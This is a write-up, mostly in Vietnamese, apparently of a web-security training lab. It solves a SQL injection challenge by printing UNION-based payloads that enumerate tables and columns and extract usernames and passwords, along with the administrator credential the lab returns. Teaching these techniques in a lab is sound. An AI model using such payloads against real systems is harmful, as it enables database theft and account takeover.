# **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.  
 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.  
  To solve the lab, log in as the `administrator` user.  

  # **Solution**

Vẫn sẽ đặt mục tiêu ở chức năng filter sản phẩm của web:

```
https://0a5500af042d1e79805517a400d80071.web-security-academy.net/filter?category=Pets
```

```
' UNION SELECT NULL, NULL -- 
```

```
' UNION SELECT 'a', 'a' -- 
```

Có thể dễ dàng xác định được câu truy vấn ở filter trả về 2 cột cùng kiểu dữ liệu là chuỗi kí tự.

Tiếp theo là kiểm tra danh sách các bảng trong database:

```
' UNION SELECT 'RESULT', TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
```

Khi lấy được danh sách các bảng trong database, ta xác định được `users_lpdpzk` là bảng chứa thông tin tài khoản trong hệ thống.

Tiếp theo là xem tên các cột trong bảng để khai thác thông tin:

```
' UNION SELECT 'RESULT', COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users_lpdpzk' --
```

Ta đã lấy được tên của 2 cột chứa thông tin đăng nhập trong bảng là: `username_futveh` và`password_giysdv`. Tiếp theo là lấy thông tin đăng nhập từ đó thôi:

```
' UNION SELECT 'RESULT', username_futveh || '~~' || password_giysdv FROM users_lpdpzk -- 
```

I got it!!

> RESULT
	administrator~~vek6olikidhl8fkymn6c

Với câu truy vấn trên, ta đã lấy được thông tin đăng nhập từ bảng `users_lpdpzk`. Cuối cùng chỉ cần dùng thông tin của tài khoản `administrator` để  đăng nhập thôi. 

Done~~

![image](https://i.pinimg.com/550x/62/82/41/628241b01dc7c4fa2bea6ea702713a87.jpg)